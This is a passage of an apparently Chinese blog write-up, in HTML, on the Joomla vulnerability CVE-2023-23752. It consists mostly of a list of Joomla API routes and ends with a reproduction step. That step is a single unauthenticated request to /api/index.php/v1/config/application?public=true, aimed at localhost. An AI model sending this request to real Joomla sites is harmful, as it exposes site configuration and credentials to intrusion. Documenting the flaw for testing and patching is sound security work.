class="line">v1/fields/contacts/contact/:id</span><br><span class="line">v1/fields/contacts/contact</span><br><span class="line">v1/fields/contacts/contact/:id</span><br><span class="line">v1/fields/contacts/contact/:id</span><br><span class="line">v1/fields/contacts/mail</span><br><span class="line">v1/fields/contacts/mail/:id</span><br><span class="line">v1/fields/contacts/mail</span><br><span class="line">v1/fields/contacts/mail/:id</span><br><span class="line">v1/fields/contacts/mail/:id</span><br><span class="line">v1/fields/contacts/categories</span><br><span class="line">v1/fields/contacts/categories/:id</span><br><span class="line">v1/fields/contacts/categories</span><br><span class="line">v1/fields/contacts/categories/:id</span><br><span class="line">v1/fields/contacts/categories/:id</span><br><span class="line">v1/fields/groups/contacts/contact</span><br><span class="line">v1/fields/groups/contacts/contact/:id</span><br><span class="line">v1/fields/groups/contacts/contact</span><br><span class="line">v1/fields/groups/contacts/contact/:id</span><br><span class="line">v1/fields/groups/contacts/contact/:id</span><br><span class="line">v1/fields/groups/contacts/mail</span><br><span class="line">v1/fields/groups/contacts/mail/:id</span><br><span class="line">v1/fields/groups/contacts/mail</span><br><span class="line">v1/fields/groups/contacts/mail/:id</span><br><span class="line">v1/fields/groups/contacts/mail/:id</span><br><span class="line">v1/fields/groups/contacts/categories</span><br><span class="line">v1/fields/groups/contacts/categories/:id</span><br><span class="line">v1/fields/groups/contacts/categories</span><br><span class="line">v1/fields/groups/contacts/categories/:id</span><br><span class="line">v1/fields/groups/contacts/categories/:id</span><br><span class="line">v1/contacts/:id/contenthistory</span><br><span class="line">v1/contacts/:id/contenthistory/keep</span><br><span class="line">v1/contacts/:id/contenthistory</span><br><span class="line">v1/content/articles</span><br><span class="line">v1/content/articles/:id</span><br><span class="line">v1/content/articles</span><br><span class="line">v1/content/articles/:id</span><br><span class="line">v1/content/articles/:id</span><br><span class="line">v1/content/categories</span><br><span class="line">v1/content/categories/:id</span><br><span class="line">v1/content/categories</span><br><span class="line">v1/content/categories/:id</span><br><span class="line">v1/content/categories/:id</span><br><span class="line">v1/fields/content/articles</span><br><span class="line">v1/fields/content/articles/:id</span><br><span class="line">v1/fields/content/articles</span><br><span class="line">v1/fields/content/articles/:id</span><br><span class="line">v1/fields/content/articles/:id</span><br><span class="line">v1/fields/content/categories</span><br><span class="line">v1/fields/content/categories/:id</span><br><span class="line">v1/fields/content/categories</span><br><span class="line">v1/fields/content/categories/:id</span><br><span class="line">v1/fields/content/categories/:id</span><br><span class="line">v1/fields/groups/content/articles</span><br><span class="line">v1/fields/groups/content/articles/:id</span><br><span class="line">v1/fields/groups/content/articles</span><br><span class="line">v1/fields/groups/content/articles/:id</span><br><span class="line">v1/fields/groups/content/articles/:id</span><br><span class="line">v1/fields/groups/content/categories</span><br><span class="line">v1/fields/groups/content/categories/:id</span><br><span class="line">v1/fields/groups/content/categories</span><br><span class="line">v1/fields/groups/content/categories/:id</span><br><span class="line">v1/fields/groups/content/categories/:id</span><br><span class="line">v1/content/articles/:id/contenthistory</span><br><span class="line">v1/content/articles/:id/contenthistory/keep</span><br><span class="line">v1/content/articles/:id/contenthistory</span><br><span class="line">v1/extensions</span><br><span class="line">v1/languages/content</span><br><span class="line">v1/languages/content/:id</span><br><span class="line">v1/languages/content</span><br><span class="line">v1/languages/content/:id</span><br><span class="line">v1/languages/content/:id</span><br><span class="line">v1/languages/overrides/search</span><br><span class="line">v1/languages/overrides/search/cache/refresh</span><br><span class="line">v1/languages/overrides/site/zh-CN</span><br><span class="line">v1/languages/overrides/site/zh-CN/:id</span><br><span class="line">v1/languages/overrides/site/zh-CN</span><br><span class="line">v1/languages/overrides/site/zh-CN/:id</span><br><span class="line">v1/languages/overrides/site/zh-CN/:id</span><br><span class="line">v1/languages/overrides/administrator/zh-CN</span><br><span class="line">v1/languages/overrides/administrator/zh-CN/:id</span><br><span class="line">v1/languages/overrides/administrator/zh-CN</span><br><span class="line">v1/languages/overrides/administrator/zh-CN/:id</span><br><span class="line">v1/languages/overrides/administrator/zh-CN/:id</span><br><span class="line">v1/languages/overrides/site/en-GB</span><br><span class="line">v1/languages/overrides/site/en-GB/:id</span><br><span class="line">v1/languages/overrides/site/en-GB</span><br><span class="line">v1/languages/overrides/site/en-GB/:id</span><br><span class="line">v1/languages/overrides/site/en-GB/:id</span><br><span class="line">v1/languages/overrides/administrator/en-GB</span><br><span class="line">v1/languages/overrides/administrator/en-GB/:id</span><br><span class="line">v1/languages/overrides/administrator/en-GB</span><br><span class="line">v1/languages/overrides/administrator/en-GB/:id</span><br><span class="line">v1/languages/overrides/administrator/en-GB/:id</span><br><span class="line">v1/languages</span><br><span class="line">v1/languages</span><br><span class="line">v1/media/adapters</span><br><span class="line">v1/media/adapters/:id</span><br><span class="line">v1/media/files</span><br><span class="line">v1/media/files/:path/</span><br><span class="line">v1/media/files/:path</span><br><span class="line">v1/media/files</span><br><span class="line">v1/media/files/:path</span><br><span class="line">v1/media/files/:path</span><br><span class="line">v1/menus/site</span><br><span class="line">v1/menus/site/:id</span><br><span class="line">v1/menus/site</span><br><span class="line">v1/menus/site/:id</span><br><span class="line">v1/menus/site/:id</span><br><span class="line">v1/menus/administrator</span><br><span class="line">v1/menus/administrator/:id</span><br><span class="line">v1/menus/administrator</span><br><span class="line">v1/menus/administrator/:id</span><br><span class="line">v1/menus/administrator/:id</span><br><span class="line">v1/menus/site/items</span><br><span class="line">v1/menus/site/items/:id</span><br><span class="line">v1/menus/site/items</span><br><span class="line">v1/menus/site/items/:id</span><br><span class="line">v1/menus/site/items/:id</span><br><span class="line">v1/menus/administrator/items</span><br><span class="line">v1/menus/administrator/items/:id</span><br><span class="line">v1/menus/administrator/items</span><br><span class="line">v1/menus/administrator/items/:id</span><br><span class="line">v1/menus/administrator/items/:id</span><br><span class="line">v1/menus/site/items/types</span><br><span class="line">v1/menus/administrator/items/types</span><br><span class="line">v1/messages</span><br><span class="line">v1/messages/:id</span><br><span class="line">v1/messages</span><br><span class="line">v1/messages/:id</span><br><span class="line">v1/messages/:id</span><br><span class="line">v1/modules/types/site</span><br><span class="line">v1/modules/types/administrator</span><br><span class="line">v1/modules/site</span><br><span class="line">v1/modules/site/:id</span><br><span class="line">v1/modules/site</span><br><span class="line">v1/modules/site/:id</span><br><span class="line">v1/modules/site/:id</span><br><span class="line">v1/modules/administrator</span><br><span class="line">v1/modules/administrator/:id</span><br><span class="line">v1/modules/administrator</span><br><span class="line">v1/modules/administrator/:id</span><br><span class="line">v1/modules/administrator/:id</span><br><span class="line">v1/newsfeeds/feeds</span><br><span class="line">v1/newsfeeds/feeds/:id</span><br><span class="line">v1/newsfeeds/feeds</span><br><span class="line">v1/newsfeeds/feeds/:id</span><br><span class="line">v1/newsfeeds/feeds/:id</span><br><span class="line">v1/newsfeeds/categories</span><br><span class="line">v1/newsfeeds/categories/:id</span><br><span class="line">v1/newsfeeds/categories</span><br><span class="line">v1/newsfeeds/categories/:id</span><br><span class="line">v1/newsfeeds/categories/:id</span><br><span class="line">v1/plugins</span><br><span class="line">v1/plugins/:id</span><br><span class="line">v1/plugins/:id</span><br><span class="line">v1/privacy/requests</span><br><span class="line">v1/privacy/requests/:id</span><br><span class="line">v1/privacy/requests/export/:id</span><br><span class="line">v1/privacy/requests</span><br><span class="line">v1/privacy/consents</span><br><span class="line">v1/privacy/consents/:id</span><br><span class="line">v1/privacy/consents/:id</span><br><span class="line">v1/redirects</span><br><span class="line">v1/redirects/:id</span><br><span class="line">v1/redirects</span><br><span class="line">v1/redirects/:id</span><br><span class="line">v1/redirects/:id</span><br><span class="line">v1/tags</span><br><span class="line">v1/tags/:id</span><br><span class="line">v1/tags</span><br><span class="line">v1/tags/:id</span><br><span class="line">v1/tags/:id</span><br><span class="line">v1/templates/styles/site</span><br><span class="line">v1/templates/styles/site/:id</span><br><span class="line">v1/templates/styles/site</span><br><span class="line">v1/templates/styles/site/:id</span><br><span class="line">v1/templates/styles/site/:id</span><br><span class="line">v1/templates/styles/administrator</span><br><span class="line">v1/templates/styles/administrator/:id</span><br><span class="line">v1/templates/styles/administrator</span><br><span class="line">v1/templates/styles/administrator/:id</span><br><span class="line">v1/templates/styles/administrator/:id</span><br><span class="line">v1/users</span><br><span class="line">v1/users/:id</span><br><span class="line">v1/users</span><br><span class="line">v1/users/:id</span><br><span class="line">v1/users/:id</span><br><span class="line">v1/fields/users</span><br><span class="line">v1/fields/users/:id</span><br><span class="line">v1/fields/users</span><br><span class="line">v1/fields/users/:id</span><br><span class="line">v1/fields/users/:id</span><br><span class="line">v1/fields/groups/users</span><br><span class="line">v1/fields/groups/users/:id</span><br><span class="line">v1/fields/groups/users</span><br><span class="line">v1/fields/groups/users/:id</span><br><span class="line">v1/fields/groups/users/:id</span><br><span class="line">v1/users/groups</span><br><span class="line">v1/users/groups/:id</span><br><span class="line">v1/users/groups</span><br><span class="line">v1/users/groups/:id</span><br><span class="line">v1/users/groups/:id</span><br><span class="line">v1/users/levels</span><br><span class="line">v1/users/levels/:id</span><br><span class="line">v1/users/levels</span><br><span class="line">v1/users/levels/:id</span><br><span class="line">v1/users/levels/:id</span><br></pre></td></tr></table></figure>
+
+<h2><span id="复现">复现</span></h2><h3><span id="发送请求">发送请求</span></h3><blockquote>
+<p><code>http://127.0.0.1/api/index.php/v1/config/application?public=true</code></p>
+</blockquote>
+<h3><span id="效果">效果</span></h3><blockquote>
+<p><img src="/2023/11/08/CVE-2023-23752-Joomla/10.png" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Joomla/" rel="tag">Joomla</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
             </div>
         
 
